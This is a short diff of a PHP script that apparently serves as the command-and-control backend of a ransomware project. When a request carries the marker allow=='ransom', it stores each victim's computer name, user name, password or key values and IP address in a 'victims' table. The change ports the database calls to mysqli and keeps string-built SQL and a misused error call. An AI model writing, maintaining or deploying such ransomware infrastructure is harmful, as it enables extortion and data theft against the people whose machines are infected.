@@ -13,8 +13,8 @@
       return $clean;
 }
 
-
 if (!empty($_GET['computer_name']) && !empty($_GET['userName']) && !empty($_GET['password']) && ($_GET['allow']=="ransom")){
+	
  
     $ip = getenv ("REMOTE_ADDR");   
     $off = (strip_tags(addslashes($_GET['computer_name'])));
@@ -28,11 +28,13 @@ if (!empty($_GET['computer_name']) && !empty($_GET['userName']) && !empty($_GET[
     $computer_name = $key;
     $user_name = $key_1;
     $password = $key_2;
+	
+	
     
     //save data in database 
     
 	$sql_save = "INSERT INTO victims (computer_name, user_name, password, ip) VALUES ('$computer_name','$user_name','$password','$ip')";
-    $ris = mysql_query($sql_save, $con) or die (mysql_error());
+    $ris = mysqli_query($con, $sql_save) or die (mysqli_error());
 
     /*//You can also consider to create a file and update it each time virus was run but is not raccomended
     $myfile = fopen("result.txt", "r");
